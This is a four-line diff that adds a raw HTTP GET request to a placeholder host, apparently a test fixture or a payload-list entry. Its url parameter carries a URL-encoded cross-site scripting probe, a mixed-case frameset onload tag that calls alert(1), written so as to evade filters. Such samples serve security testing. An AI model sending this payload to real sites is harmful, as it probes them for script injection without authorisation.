@@ -1,0 +1,4 @@
+GET /a?url=<fRaMeSeT%20oNlOaD%3DaLeRt(1)> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
